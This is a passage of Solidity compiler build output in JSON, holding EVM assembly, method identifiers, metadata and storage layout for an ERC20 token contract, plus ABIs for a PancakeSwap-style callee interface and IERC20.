											"value": "64732D6D6174682D7375622D756E646572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "58"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SUB"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "REVERT"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "tag",
											"value": "72"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "DUP4"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "AND"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SWAP1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "DUP2"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "MSTORE"
										},
										{
											"begin": 2681,
											"end": 2690,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "MSTORE"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SWAP1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "KECCAK256"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SLOAD"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "PUSH [tag]",
											"value": "85"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "SWAP1"
										},
										{
											"begin": 2701,
											"end": 2706,
											"name": "DUP3"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2681,
											"end": 2700,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "AND"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "tag",
											"value": "85"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP6"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "AND"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "SWAP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP2"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "MSTORE"
										},
										{
											"begin": 2663,
											"end": 2672,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "MSTORE"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP3"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "KECCAK256"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP4"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP1"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP4"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SSTORE"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "SWAP1"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "DUP5"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "AND"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "DUP2"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "MSTORE"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "KECCAK256"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "SLOAD"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "PUSH [tag]",
											"value": "86"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "SWAP1"
										},
										{
											"begin": 2751,
											"end": 2756,
											"name": "DUP3"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2733,
											"end": 2750,
											"name": "PUSH [tag]",
											"value": "87"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "AND"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "tag",
											"value": "86"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP5"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "AND"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "MSTORE"
										},
										{
											"begin": 2717,
											"end": 2726,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "MSTORE"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP3"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "KECCAK256"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP5"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP5"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MLOAD"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP6"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP2"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MLOAD"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP4"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP8"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "AND"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "PUSH",
											"value": "DDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP2"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SUB"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "ADD"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "LOG3"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "tag",
											"value": "87"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP3"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "ADD"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "LT"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "ISZERO"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "JUMPI"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6164642D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SUB"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "REVERT"
										}
									]
								},
								"8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429"
							}
						},
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"PERMIT_TYPEHASH()": "30adf81f",
							"_frozenBalance(address)": "47d5d856",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_frozenBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"ERC20.sol\":\"ERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"ERC20.sol\":{\"keccak256\":\"0x59f3a9c274714d7b3493d7898f412eee5e2aa3df408df3a67134f5333112aaab\",\"urls\":[\"bzz-raw://45d02bb45a633b1dac3a8bb29be50cb07117f65e11a2c7214290a7d9e34c9688\",\"dweb:/ipfs/Qme3WmF8PrqUH7D9XggNYZEaHHR2nTLd2Ld7C14T68TgY3\"]},\"IERC20.sol\":{\"keccak256\":\"0xa45dab2f2a6e81dff31d7f62a0b0513ae09f7f01ee22d0970e2b532e2b14fad8\",\"urls\":[\"bzz-raw://5b5177e85ae0239a5d633ca2d83652b0fc63622f0bc317a3d32a3661f50d7537\",\"dweb:/ipfs/QmdV9Jp5icxxC3SYVVuwQTKXMcWicDToahxUxdkFCJC4M9\"]},\"SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 19,
								"contract": "ERC20.sol:ERC20",
								"label": "totalSupply",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 23,
								"contract": "ERC20.sol:ERC20",
								"label": "balanceOf",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 29,
								"contract": "ERC20.sol:ERC20",
								"label": "allowance",
								"offset": 0,
								"slot": "2",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 33,
								"contract": "ERC20.sol:ERC20",
								"label": "_frozenBalance",
								"offset": 0,
								"slot": "3",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 35,
								"contract": "ERC20.sol:ERC20",
								"label": "DOMAIN_SEPARATOR",
								"offset": 0,
								"slot": "4",
								"type": "t_bytes32"
							},
							{
								"astId": 42,
								"contract": "ERC20.sol:ERC20",
								"label": "nonces",
								"offset": 0,
								"slot": "5",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_bytes32": {
								"encoding": "inplace",
								"label": "bytes32",
								"numberOfBytes": "32"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"ICallee.sol": {
				"ICallee": {
					"abi": [
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "pancakeCall",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"pancakeCall(address,uint256,uint256,bytes)": "84800812"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"pancakeCall\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"ICallee.sol\":\"ICallee\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"ICallee.sol\":{\"keccak256\":\"0xdd42904310b0f5d040eef9abb7b14327315f8437576e7fc7c1ea004130bf138a\",\"urls\":[\"bzz-raw://6377a208affde795cbdbd2024e38b1dd7ddabd51cc106974ad583d062a636de1\",\"dweb:/ipfs/QmNgMBbkfLbuf9yZSqY57HR5Nh8esYyGXgHNnSY2K1DsNe\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
